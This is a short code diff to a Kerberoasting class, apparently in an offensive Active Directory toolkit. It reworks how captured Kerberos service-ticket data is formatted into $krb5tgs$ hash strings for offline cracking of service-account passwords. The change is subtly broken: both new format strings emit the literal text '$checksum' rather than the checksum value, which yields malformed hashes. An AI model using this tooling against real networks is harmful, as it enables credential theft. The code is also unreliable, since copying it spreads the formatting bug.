@@ -104,14 +104,25 @@ class Kerberoasting:
     @staticmethod
     def format_entry(etype, username, realm, spn, cipher_octets):
         spn = spn.replace(":", "~")
-        if etype in [constants.EncryptionTypes.rc4_hmac.value, constants.EncryptionTypes.des_cbc_md5.value]:
+
+        # des_cbc_md5.value - $krb5tgs$%d$*%s$%s$%s*$%s$%s
+        # aes256_cts_hmac_sha1_96.value - $krb5tgs$%d$%s$%s$*%s*$%s$%s
+        # aes128_cts_hmac_sha1_96.value - $krb5tgs$%d$%s$%s$*%s*$%s$%s
+        # rc4_hmac.value - "$krb5tgs$%d$*%s$%s$%s*$%s$%s
+        
+        if etype == constants.EncryptionTypes.rc4_hmac.value or etype == constants.EncryptionTypes.des_cbc_md5.value:
             checksum = hexlify(cipher_octets[:16]).decode()
             data = hexlify(cipher_octets[16:]).decode()
-        else:  # AES128 and AES256
+            entry_format = f"$krb5tgs${etype}$*{username}${realm}${spn}*$checksum${data}"
+            
+        elif etype == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value or etype == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
             checksum = hexlify(cipher_octets[-12:]).decode()
             data = hexlify(cipher_octets[:-12]).decode()
+            entry_format = f"$krb5tgs${etype}${username}${realm}$*{spn}*$checksum${data}"
+        else:
+            return f"[red][!][/] Unsupported encryption type: {etype}"
         
-        return f"$krb5tgs${etype}$*{username}${realm}${get_domain()}/{username}*${checksum}${data}"
+        return entry_format
 
     def output_tgs(self, tgs, old_session_key, session_key, username, spn, fd=None):
         decoded_tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
